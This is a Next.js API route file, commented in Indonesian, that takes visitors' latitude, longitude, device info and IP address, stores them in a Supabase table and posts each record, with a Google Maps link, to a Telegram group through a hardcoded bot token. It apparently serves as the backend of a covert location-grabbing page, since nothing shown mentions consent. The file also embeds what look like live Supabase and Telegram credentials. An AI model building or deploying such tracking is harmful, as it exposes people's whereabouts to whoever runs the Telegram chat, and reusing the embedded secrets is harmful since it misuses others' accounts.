// src/app/api/save-location/route.js
import { createClient } from '@supabase/supabase-js';
import fetch from 'node-fetch'; // Tambahkan ini jika belum ada di dependencies

// Inisialisasi Supabase
const supabaseUrl = 'https://dmidagxixicbnagktjxd.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRtaWRhZ3hpeGljYm5hZ2t0anhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjU5NDk0MzcsImV4cCI6MjA0MTUyNTQzN30.W5_oH1H_d1G6rltP-r_y-b-ZGwqhTUulNUzr2rjlq1Q';
const supabase = createClient(supabaseUrl, supabaseKey);

// Inisialisasi Telegram Bot
const telegramBotToken = '7228539103:AAGMrGW6HA41aKYycNXFo8tCqQp_Z7xjrSA';
const telegramChatId = '-1002236749350_1'; // ID chat atau grup di Telegram
const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

async function sendToTelegram(message) {
  try {
    await fetch(telegramApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Failed to send message to Telegram:', error);
  }
}

export async function POST(request) {
  try {
    const { latitude, longitude, device_info } = await request.json();

    // Mendapatkan alamat IP dari request
    const ip_address = request.headers.get('x-forwarded-for') || 'unknown';

    // Membuat URL Google Maps
    const google_maps_url = `https://www.google.com/maps/@${latitude},${longitude},21z`;

    // Simpan data ke Supabase
    const { data, error } = await supabase
      .from('clients_visit')
      .insert([{ ip_address, latitude, longitude, google_maps_url, device_info }]);

    if (error) {
      return new Response(JSON.stringify({ status: 'error', message: error.message }), {
        status: 500,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Content-Type': 'application/json',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    // Ambil data terakhir dari Supabase
    const { data: lastEntry, error: fetchError } = await supabase
      .from('clients_visit')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(1)
      .single();

    if (fetchError) {
      return new Response(JSON.stringify({ status: 'error', message: fetchError.message }), {
        status: 500,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Content-Type': 'application/json',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    // Kirim data terakhir ke Telegram
    const message = `New visit: \nIP Address: ${lastEntry.ip_address} \nLatitude: ${lastEntry.latitude} \nLongitude: ${lastEntry.longitude} \nDevice Info: ${lastEntry.device_info} \nGoogle Maps URL: ${lastEntry.google_maps_url}`;
    await sendToTelegram(message);

    return new Response(JSON.stringify({ status: 'success', message: 'Location and device info saved' }), {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/json',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  } catch (error) {
    return new Response(JSON.stringify({ status: 'error', message: error.message }), {
      status: 500,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/json',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }
}

// Menangani permintaan OPTIONS
export async function OPTIONS() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
